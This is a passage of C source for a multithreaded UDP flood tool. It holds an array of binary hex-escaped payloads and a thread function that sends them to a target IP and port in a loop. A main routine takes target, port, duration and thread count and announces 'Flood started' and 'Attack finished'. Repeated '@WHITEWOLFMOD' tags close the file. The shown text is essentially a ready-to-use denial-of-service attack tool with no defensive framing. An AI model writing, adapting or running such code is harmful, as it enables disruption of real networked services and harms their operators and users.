\x013\x02D\x071\x0B3\x009\x06B\x0A7\x0C3\x013\x02D\x0C8\x08F\x061\x0F6\x06A\x00F\x030\x066\x001\x005\x0AD\x0B3\x0CD\x05F\x031\x000\x056\x00F\x08B\x002\x0EA\x040\x09A\x048\x05C\x059\x069\x09E\x04D\x031\x0E1\x058\x09F\x071\x063\x0FB\x072\x095\x056\x06E\x0B4\x0BF\x013\x06D\x0D9\x05C\x0C4\x084\x062\x072\x0CE\x025\x0E1\x0D2\x09F\x079\x036\x0AC\x044\x015\x0F6\x0DF\x09D\x074\x014\x056\x080\x089\x0D0\x0EE\x058\x00C\x071\x0B3\x009\x06B\x0A7\x0C3\x013\x02D\x071\x0B3\x009\x06B\x0A7\x0C3\x013\x02D",
        "\x08F\x025\x0CA\x061\x0FB\x05A\x024\x009\x03C\x0E2\x01A\x086\x0BD\x0C8\x06E\x0B5\x07C\x034\x01B\x0E8\x039\x0F2\x078\x04E\x037\x006\x0EF\x0FF\x04C\x064\x023\x097\x0B7\x06F\x0E1\x028\x044\x001\x07B\x039\x080\x0CC\x0FA\x09D\x021\x077\x00C\x043\x0EF\x0C4\x0A8\x0A1\x0BA\x0E7\x04B\x067\x027\x06E\x0BD\x012\x08C\x04E\x0A8\x082\x0E2\x046\x0EB\x087\x059\x0F8\x0F9\x0EB\x046\x07A\x022\x078\x034\x0ED\x0E8\x0CF\x006\x09F\x0F8\x0D5\x035\x063\x07C\x0DB\x0E3\x015\x053\x002\x04F\x075\x0F2\x01D\x0E2\x08B\x09D\x0F6\x02C\x07C\x0DF\x09E\x067\x0DD\x036\x0A8\x07D\x0AB\x0AC\x07F\x020\x0A9\x0BE\x089\x0F8\x0D0\x00E\x099\x098\x09A\x0B3\x00A\x008\x0E8\x03B\x0E3\x0DE\x0D3\x015\x053\x06A\x0FF\x058\x0C3\x0BB\x0C7\x032\x081\x022\x071\x04B\x095\x0F5\x0E0\x0C7\x0C3\x081\x0B4\x054\x090\x00C\x0E9\x015\x03F\x0A8\x07F\x0AF\x01A\x0A4\x046\x0D0\x0F9\x042\x0D8\x0EF\x016\x026\x055\x02E\x099\x07B\x0FB\x097\x0A6\x005\x0F4\x06C\x029\x028\x002\x08F\x0AC\x0F0\x0EE\x0AF\x077\x08A\x019\x06D\x03C\x0A7\x075\x096\x0AF\x0FC\x055\x0E6\x09A\x073\x09D\x0E7\x08D\x0CB\x04F\x09D\x0AC\x063\x0C7\x06F\x07F\x096\x036\x0E8\x0E2\x063\x0C7\x06F\x07F\x096\x036\x0E8\x0E2",
        "\x0BB\x025\x08F\x0EC\x0AC\x010\x08C\x06B\x018\x077\x0D3\x00A\x0B2\x0C8\x026\x075\x0FF\x098\x088\x07E\x010\x0C4\x006\x042\x064\x083\x0C3\x02A\x043\x0A4\x0AD\x056\x0A2\x0BB\x038\x068\x050\x0C1\x0CD\x050\x038\x0B8\x0A0\x0AE\x089\x00A\x0BC\x03F\x029\x03C\x0F1\x08F\x02E\x032\x0EF\x0B3\x09F\x02F\x014\x0BC\x083\x064\x064\x02D\x02E\x04B\x06C\x0FC\x006\x014\x0B5\x070\x014\x0BD\x049\x0FA\x06D\x0AD\x0A2\x032\x0DE\x007\x0DE\x09A\x0E0\x087\x0EF\x017\x074\x004\x089\x01C\x0F2\x0CD\x0A8\x00D\x0FF\x044\x043\x0BB\x039\x081\x00F\x043\x0BC\x046\x02A\x0B8\x0A9\x060\x015\x0B6\x023\x0B0\x028\x058\x0A3\x055\x0EF\x01F\x049\x073\x0EA\x01C\x015\x042\x022\x06C\x061\x079\x0DD\x026\x0CB\x0BF\x0BE\x0BE\x0F2\x004\x01D\x02D\x0A6\x031\x042\x088\x018\x01D\x0C3\x01C\x055\x070\x0A8\x0C9\x010\x08E\x03F\x0C3\x0EB\x001\x01B\x0EB\x0B1\x02F\x0CA\x025\x0F3\x045\x03F\x099\x000\x032\x071\x095\x02F\x0B3\x0F6\x01B\x082\x089\x0A1\x00D\x0F8\x0BC\x0E9\x026\x014\x083\x07E\x0D7\x0D8\x079\x0E8\x01C\x0D8\x0C9\x0E7\x090\x040\x01C\x02D\x0DE\x0BF\x0C2\x0BC\x043\x005\x0E6\x0D1\x0ED\x0EF\x01A\x0A6\x0E2\x095\x06B\x0B9\x083\x0B2\x0A8\x0F7",
        "\x87\x25\x07\xEC\x6C\x3C\x46\x7D\x4A\xB3\x8D\x4F\x22\xBE\xB3\xE9\x5B\xD1\x4D\xB4\x2F\xE1\x11\x12\x0A\xBA\xAB\xDA\x88\xCC\xD1\x87\x5D\x62\x9E\x4F\x8E\xC2\xD5",
        "\xB3\x25\x5F\xEC\xAC\x11\x1C\x68\x50\x4B\x65\x8E\x57\x7E\x8F\xCE\x35\x17\x49\xB2\xB5\x72\x8B\x9A\xD1\x00\xAA\x2C\x40",
        "\xB7\x25\x57\xEC\x4C\x14\xDE\x49\xD6\x71\x8E\x3A\x61\xC7\x1E\x13\xED\xAE\x68\xEA\x34\x68\x9B\x8E\x2C\x20\xE0\xF8\x2C\xCF\x33\xFB\xC3\xD7\x11\x2D\xD4\xFE\x42\x56\x57\x6F\x5D\xFD\xBB\x8D\x1D\x63\x65\x2A\xC2\xF6\x82\x5A",
        "\x0BF\x025\x007\x0EC\x06C\x03C\x046\x07D\x04A\x0B3\x0AD\x0F1\x021\x0FE\x0F6\x0E9\x05B\x082\x04B\x0B4\x02F\x0E1\x011\x012\x00F\x0BA\x0AB\x0C6\x088\x03C\x0D0\x087\x07D\x06D\x09E\x057\x08E\x0C2\x0CD\x0DA\x0E9\x0DE\x08D\x0EB\x0D5\x0B9\x07E\x065\x01A\x06C\x0E0\x0B3\x095\x036\x0E5\x0FA\x08C\x038\x0C2\x070\x014\x0F9\x069\x07B\x0C4\x047\x0A0\x028\x051\x098\x079\x02C\x082\x0B7\x045\x0F4\x06F\x06A\x027\x03F\x055\x043\x048\x0CD\x075\x08A\x0B9\x002\x0B4\x082\x01F\x051\x0BF\x058\x0EF\x099\x0EE\x052\x052\x07B\x0E5\x018\x055\x05E\x0F0\x08D\x06B\x0EE\x07E\x0EE\x05A\x0B6\x021\x0E5\x0F3\x045\x0AF\x006\x064\x05C\x00B\x0B5\x02D\x092\x015\x08D\x0EF\x0AD\x027\x0AE\x013\x0E6\x007\x075\x0F4\x079\x0E9\x0A7\x01B\x088\x089\x06D\x058\x052\x0F4\x00B\x0D3\x044\x0C8\x02C\x07B\x081\x091\x048\x0F3\x04A\x0A6\x0CA\x058\x07D\x0E6\x0BA\x08D\x0B0\x022\x09E\x04A\x0EB\x038\x0A2\x092\x0AC\x06D\x0FB\x0B6\x0FC\x001\x008\x0A2\x0CD\x0E8\x066\x0A3\x060\x057\x048\x03F\x090\x098\x07C\x024\x00C\x062\x063\x0E5\x0FE\x028\x01A\x0A8\x081\x03B\x020\x07B\x0B3\x0F7\x0DF\x0E3\x0B5\x0DE\x0D2\x0B6\x010\x009\x0EC\x07C\x04F\x0AA\x075\x06F\x083\x071\x022\x040\x03F\x0AA\x0C4\x0EB\x05A\x0AD\x0C7\x024\x078\x07D\x0C3\x081\x0C2\x00D\x07B\x0AD\x080\x093\x0A4\x0B9\x0A1\x05A\x0BB\x029\x3E\x04A\x0EB\x0C4\x0E9\x02E\x096\x07A\x04A\x007\x076\x038\x029\x03E\x004\x040\x082\x057\x00F\x0BF\x0DF\x01D\x0E0\x0C8\x0F0\x0E1\x029\x0A2\x0B5\x0FD\x007\x0F8\x05C\x095\x0ED\x046\x064\x0B9\x09C\x080\x001\x0F6\x0A6\x0B7\x09F\x03C\x0D4\x0CF\x0BD\x0F0\x092\x082\x08D\x0D1\x02F\x01C\x024\x078\x07D\x0C3\x081\x0C2\x00D\x07B\x0AD\x080\x093\x0A4\x0B9\x0A1\x05A\x0BB\x029\x3E\x04A\x0EB\x0C4\x0E9\x02E\x096\x07A\x04A\x007\x076\x038\x029\x03E\x004\x040\x082\x057\x00F\x0BF\x0DF\x01D\x0E0\x0C8\x0F0\x0E1\x029\x0A2\x0B5\x0FD",
        "\x0AF\x025\x007\x0EC\x06C\x001\x0C6\x07F\x04A\x0B3\x0CD\x052\x021\x03E\x042\x0E8\x05B\x08B\x049\x0B4\x02F\x0E1\x011\x012\x00A\x0BA\x0AB\x0C6\x088\x0DC\x0D3\x087\x0FD\x06D\x0BE\x019\x0D5\x041\x0BB\x091\x0E3\x0C6\x03F\x0F2\x0DA\x012\x05F\x0E5\x0B9\x0AB\x0C7\x023\x068\x000\x057\x0B7\x002\x099\x013\x0D8\x0C9\x0BD\x084\x094\x059\x03D\x0FC\x090\x093\x0BE\x075\x041\x095\x028\x0EF\x0CA\x0F7\x037\x02C\x065\x0E0\x073\x021\x055\x0EE\x092\x04B\x091\x073\x080\x0F8\x01C\x07C\x04C\x0B8\x0AF\x01E\x018\x00A\x028\x0A0\x038\x0EC\x006\x0C5\x051\x087\x09F\x02E\x050\x000\x0D3\x0ED\x0B9\x0AB\x0C7\x023\x068\x000\x057\x0B7\x002\x099\x013\x0D8\x0C9\x0BD\x084\x094\x059\x03D\x0FC\x090\x093\x0BE\x075\x041\x095\x028\x0EF\x0CA\x0F7\x037\x02C\x065\x0E0\x073\x021\x055\x0EE\x092\x04B\x091\x073\x080\x0F8\x01C\x07C\x04C\x0B8\x0AF\x01E\x018\x00A\x028\x0A0",
        "\x0A3\x025\x0DA\x061\x0F3\x05A\x038\x009\x032\x0B2\x0C2\x006\x004\x0C8\x0A4\x02D\x07E\x06E\x067\x013\x0A4\x02A\x0C9\x034\x0FA\x085\x0E4\x08A\x01E\x0F4\x017\x05B\x063\x08E\x0B9\x0E9\x0D9\x000\x00C\x0F6\x068\x062\x026\x0F2\x0DA\x092\x0B1\x0B8\x023\x030\x0FF\x08D\x0E9\x0B7\x0E2\x038\x01B\x022\x0D9\x029\x04E\x0A9\x071\x0AD\x074\x00A\x0B6\x066\x09D\x00F\x075\x031\x054\x0E7\x04E\x06B\x03A\x0FB\x037\x03F\x015\x0CA\x045\x007\x0FF\x007\x0B0\x00F\x0B4\x046\x0CE\x0DB\x03E\x058\x0EF\x005\x04E\x029\x0F8\x081\x090\x00F\x038\x01A\x0CE\x090\x06B\x09F\x06F\x022\x09C\x08E\x07E\x0C4\x055\x06B\x087\x068\x0EB\x080\x0F9\x0EB\x0A4\x0CD\x052\x05D\x0B6\x09F\x0F5\x03B\x024\x031\x00D\x03A\x094\x08D\x099\x0F6\x069\x081\x03C\x0B5\x0EA\x0B8\x041\x0E8\x0AF\x04B\x03E\x058\x0EF\x005\x04E\x029\x0F8\x081\x090\x00F\x038\x01A\x0CE\x090\x06B\x09F\x06F\x022\x09C\x08E\x07E\x0C4\x055\x06B\x087\x068\x0EB\x080\x0F9\x0EB\x0A4\x0CD\x052\x05D\x0B6\x09F\x0F5\x03B\x024\x031\x00D\x03A\x094\x08D\x099\x0F6\x069\x081\x03C\x0B5\x0EA\x0B8\x041\x0E8\x0AF\x04B\x03E\x058\x0EF\x005\x04E\x029\x0F8\x081\x090\x00F\x038\x01A\x0CE\x090\x06B\x09F\x06F\x022\x09C\x08E\x07E\x0C4\x055\x06B\x087\x068\x0EB\x080\x0F9\x0EB\x0A4\x0CD\x052\x05D\x0B6\x09F\x0F5\x03B\x024\x031\x00D",
        "\x0A7\x025\x05F\x0EC\x08C\x011\x01C\x068\x050\x04B\x065\x04E\x010\x07F\x0EF\x0CE\x0E5\x014\x085\x085\x0BF\x07F\x09C\x05F\x012\x04F\x0CB\x02A\x073\x066\x0DF\x093\x039\x0A7\x04D\x063\x029\x0F5\x0C5\x0D6\x0E9\x023\x0BC\x0B4\x0E0\x05B\x02A\x0D7\x0E6\x0E2\x09C\x086\x00A\x01A\x0F6\x057\x046\x020\x0C2\x020\x053\x011\x0AD\x08A\x0E2\x045\x0A1\x097\x08C\x0FD\x046\x0D0\x0C7\x09A\x098\x0E1\x0D6\x0A4\x0CB\x057\x039\x004\x0AE\x0E4\x0F6\x02D\x0E6\x024\x05A\x015\x09F\x02E\x049\x0C9\x0E8\x0A7\x0E8\x0DF\x09F\x02C\x0E9\x0C1\x0D9\x053\x041\x05C\x0B7\x0EC\x065\x0B7\x040\x0BC\x063\x0F4\x0E3\x0DA\x0E0\x014\x06F\x0DB\x001\x0F2\x02C\x0D0\x09C\x00F\x0E9\x0EF\x06C\x0F4\x048\x0A1\x085\x0AE\x0B2\x02E\x0BE\x036\x09A\x013\x092\x0F5\x0CE\x085\x0BA\x0CC\x05F\x005\x04E\x029\x0B2\x042\x054\x018\x068\x056\x0E6\x097\x0CF\x0B0\x0ED\x0B9\x047\x0B3\x0A6\x0D5\x04E\x0B6\x01C\x0B4\x037\x0C3\x0FE\x0EE\x060\x00B\x05B\x012\x0BD\x081\x024\x031\x026\x0E6\x056\x08A\x0F1\x0DB\x018\x0F8\x0F4\x013\x0B6\x0E8\x037\x069\x091\x03F\x03F\x001\x0AD\x0FA\x0E3\x0E0\x06E\x003\x07B\x0A9\x05E\x0AD\x0EC\x023\x0EB\x062\x0E4\x05E\x094\x029\x035\x0DC\x07D\x062\x09C\x019\x058\x0CC\x090\x08B\x096\x049\x073\x0CE\x068\x0B8\x0F5\x0A2\x026\x09D\x01A\x099\x022\x05F\x0AF\x0DD\x047\x014\x07E\x004\x0D6\x082\x09C\x019\x02B\x0E3\x057\x0E2\x025\x082\x0FE\x0ED\x087\x04C\x0FE\x051\x011\x0A7\x0DC\x010\x066\x0B9\x061\x06C\x04A\x064\x077\x071\x0B0\x01D\x060\x03E\x044\x0A2\x04E\x095\x0BC\x0CA\x02A\x02C\x0ED\x01F\x0AB",
        "\xAB\x25\x47\xE8\x2C\x13\xAE\x8C\xBA\xF8\xB1\x4D\xAC\xC8\x4E\x18\xD4\x43\xB0\xB2\x35\x62",
        "\x05B\x025\x0A2\x061\x0CF\x05A\x03A\x009\x033\x062\x01D\x07E\x0D2\x008\x01E\x095\x0FB\x0AA\x0C1\x095\x07C\x0FB\x05D\x0B4\x0E2\x099\x0ED\x062\x08A\x020\x025\x097\x063\x06E\x072\x0C9\x028\x052\x00D\x0D0\x0E7\x0E3\x03D\x032\x032\x0BF\x02E\x04D\x097\x060\x0C2\x07B\x07E\x0C3\x05B\x0E5\x0CB\x014\x00F\x09D\x038\x079\x0E3\x05C\x0C9\x0ED\x007\x07B\x017\x07E\x03F\x01B\x0F2\x0CC\x0BF\x081\x091\x0FD\x0F3\x042\x08E\x037\x09F\x0F8\x041\x0FD\x0A9\x0F1\x0CE\x098\x039\x0EB\x027\x079\x073\x0F8\x08F\x0B1\x031\x020\x02F\x0B2\x033\x07E\x00C\x0FB\x031\x0D2\x082\x03C\x02C\x080\x075\x087\x094\x06F\x0D3\x02E\x0F8\x044\x0BB\x024\x0DE\x026\x088\x09B\x014\x0D0\x090\x088\x069\x07B\x03F\x0A9\x0CD\x00F\x03C\x015\x07E\x048\x030\x056\x0E8\x0A1\x046\x094\x02F\x092\x0D8\x05C\x040\x015\x0A3\x0D9\x02A\x05A\x02E\x07F\x036\x01B\x031\x003\x03D\x06B\x03F\x025\x057\x06B\x087\x068\x017\x0B9\x0A3\x0D4\x05C\x03C\x0AB\x08F\x081\x0E3\x053\x098\x0F5\x09E\x04D\x029\x0E7\x048\x0C7\x04A\x02B\x0F9\x097\x058\x0F3\x032\x058\x0EC\x02F\x00F\x09F\x07E\x017\x07E\x03F\x01B\x0F2\x0CC\x0BF\x081\x091\x0FD\x0F3\x042\x08E\x037\x09F\x0F8\x041\x0FD\x0A9\x0F1\x0CE\x098\x039\x0EB\x027\x079\x073\x0F8\x08F\x0B1\x031\x020\x02F\x0B2\x033\x07E\x00C\x0FB\x031\x0D2\x082\x03C\x02C\x080\x075\x087\x094\x06F\x0D3\x02E\x0F8\x044\x0BB\x024\x0DE\x026\x088\x09B\x014\x0D0\x090\x088\x069\x07B\x03F\x0A9\x0CD\x00F\x03C\x015\x07E\x048\x030\x056\x0E8\x0A1\x046\x094\x02F\x092\x0D8\x05C\x040\x015\x0A3\x0D9\x02A\x05A\x02E\x07F\x036\x01B\x031\x003\x03D\x06B\x03F\x025\x057\x06B\x087\x068\x017\x0B9\x0A3\x0D4\x05C\x03C\x0AB\x08F\x081\x0E3\x053\x098\x0F5\x09E\x04D\x029\x0E7\x048\x0C7\x04A\x02B\x0F9\x097\x058\x0F3\x032\x058\x0EC\x02F\x00F\x09F\x07E\x017\x07E\x03F\x01B\x0F2\x0CC\x0BF\x081\x091\x0FD\x0F",
        "\x5F\x25\xAC\x61\xCA\xDA\x3B\x49\x30\x82\x1C\x86\xBD\xC8\x6E\xB5\x7C\x34\x1B\xE4\x38\xF2\x78\xBE\x30\x06\xFF\xCB\x4C\x64\x23\x97\xE7\x6F\x89\x28\x44\x01\x33\x1A\x80\xC0\xE0\x9D\x21\xED\x0B\x43\xEF\xC4\xA8\x59\x0A\xE4\xF9\x69\x56\xB8\xC3",
        "\x53\x25\x27\xED\xAC\x18\xEE\x8B\x40\xBB\x01\x92\xBE\x12\x1B\x3C\x3A\x76\x89\xB2\x35\xF8\x42\xCE\xAA\x5A\xDB\xCA\x42\x64\x25\x8F\xDE\x5B\x70\x1C\xCD\x00\x00\xAD\xE0\x36\x98\x43\x4B\xB7\xD9\x7E\xC3\x0D\x61\xE9\x50\xAA\x09\xA1\x9A\xE0\x0A\x0C\x11\xBA\x7C\x62\x9E\xCF\xA0\x4D\x1C\x29\x2C\x48\xA4\x23\xCC\x02\xC6\x27\x5E\x11\x98\x63\x93\x02\x50\xD5\x2E\xA6\x9E\xD5\x02\xA3\x5C\x31\x91\x80\xEB\xA3\x5A\xCC\xF5\x9D\x64\x9F\xC6\x78\x87\x65\x60\x3A\x11\xD0\xF1\x14\xB6\xC8\x85\xD9\x0E\xF1\x98\x6E\xF2\xB7\x98\x28\x8F\xA7\x06\x7B\x39\x23\x1A\x57\xA0\x63\xBF\xC6\x5A\x39\x53\x19\x26\xF8\xBC\x99\x8F\xCE\xE8\xB9\x29\x61\xE6\x00\xA2\x35\x68\xC6\x5E\x74\xE5\x7B\x5D\xA8\xFF\x0D\x17\x16\xCA\x59\x2E\xE1\x93\x33\xA2\x7F\x31\x18\x04\x74\x75\x9B\x32\xE9\x31\x96\x2A\x77\x7E\xA4\x79\xE5\x1B\x91\x02\x2B\x88\x94\xEA\xBB\x6B\x29\xBA\xA4\x50\xA1\x48\x08\xC7\x0E\x0A\x53\x0B\xDB\x25\x9F\xB2\xA4\x55\x7A\xCC\xF3\x19\xC4\xD4\x6B\x42\xD3\xC8\xF7\xBD\x8D\x84\x60\x22\xC0\x7B\x55\x03\x0D\x95\xB2\xBE\x29\x05\xB6\x7C\x05\x55\xE8\x54\x10\xF2\xB8\x4D\xE9\xA1\xCA\x88\x3C",
        "\x57\x25\xB2\x61\xC7\x1A\x44\x6A\x0A\xB0\x4C\x72\x2E\x7C\x75\xA5\xF1\x9B\xB7\xCC\xD7\x74\x24\xD2\xC6\x49\xE3\x26\xC4\x6D\x45\x97\x95\xA0\xF7\x72\x4E\xBE\x96\x13\xB6\xE0\xB0\xB0\xFF\x72\x9E\x9A\xDA\x08\x2C\x95\xAD\x38\x35\xD3\x66\xDD\x51\x71\xD4\x72\x28\x83\x61\x45\xAC\x32\x52\xB6\xF9\xFD\xD9\x89\xAE\x9D\xCE\x10\xCB\x10\xBC\x31\xF3\x6C\x18\x26\xD0\xEF\x14\xA7\xFC\x2A\x70\x3B\xD4\x8D\x0D\xC6\x06\x37\xB2\xFA\x80\x09\xFD\x45\x19\x55\xDF\x83\xF6\xDF\x0C\xDE\x0C\x95\x60\x67\x28\x57\xC8\x80\x84\x7C\xF2\x2C\xAA\x19\x5A\xCA\xAB\x54\x64\x55\x1C\x3A\xEA\x14\xFC\xF3\x69\x0A\xAC\xEA\x9A\xA6\xBB\xB9\x65\xC8\x91\x36\xEC\x3B\x05\x2E\x45\xEC\xB0\xC7\xCC\x59\x6A\x91\xFF\x7A\xC3\xB9\x77\xD3\x78\xD7\xA3\x38\xF4\xDD\x80\x89\xA1\x6C\x52\xD2\xC5\x8F\x79\xE4\xD5\x16\xDB\xCA\x33\x5B\xB7\xB4\x39\x5A\x4E\x5D\x12\xD8\x34\xDA\xB9\x33\x75\xDE\xE0\xB5\x6C\xA5\x91\xF3\x0B\x77\x9D\x73\x48\xB1\x68\xDD\x95\x67\x16\x58\xE3\xDA\x6D\x34\x7C\xF5\xDA\x25\x34\x74\x32\xE2\x12\xE4\x4A\x6B\xA5\x83",
        "\x4B\x25\x41\xF9\xFC\x32\x00\xB3\xEF\xB3\xC1\x06\x5C\x07\xFE\x75\x7E\xBA\xC9\xBF\x35\x64\x9B\x3A\x5B\x07\x6D\x03\x4F\x0A\xCB\xDC\xCB\xA0\x34\xA4\x64\x0C\x20\x3C\xE2\xA8\xDB\xD9\xF1\xF4\x2B\xA5\x58\xAA\x4A\xBE\xD3\xCD\x53\x8E\x0D\x30\x28\x3B\x3C\x9F\x25\xD4\xCE\x6A\xEC\xDE\x3A\x32\xD4\x71\x54\xC7\x12\xE1\x91\x5D\x9D\x8E\x43\xF8\xD9\x3A\xC1\x5D\x8C\xF0\x45\x5F\x35\x4D\xE1\x7E\xF3\xFD\xCF\x92\x91\x0A\xCF\xBE\xF2\x7F\xEA\x31\xFD\x1C\xC8\xF9\x6E\x44\x34\x07\x51\xE2\x10\xA3\xBB\x61\xDC\x22\x1A\xA3\x49\x7B\x7F\x38\xBB\x3D\x21\xC2\xAF\xB2\xC5\xC2\xE1\x7B\x17\x47\x5E\xB8\xC3\x41\xC7\xD7\xEA\xF2\xD8\x1E\x04\x35\x40\x7A\x4F\x30\x5C\x56\x8F\x8A\xF6\xA5\xBB\x43\x99\x23\x10\x6D\x27\xDC\x02\x17\x03\xEA\x97\xBA\x50\x49\x81\xCC\xE8\xE6\x73\xD1\xA0\x1E\x88\x21\xA5\x2E\xAE\x60\x80\x8F\x95\xB8\xE8\xE8\x55\xDA\xF5\x65\x85\xB3\xCF\xE7\xEC\xAF\xC2\x08\xA2\x4A\x47\xB4\x6B\xD1\xBC\xA8\x74\x35\xBB\x17\x7F",
                                
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
/*
@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD
*/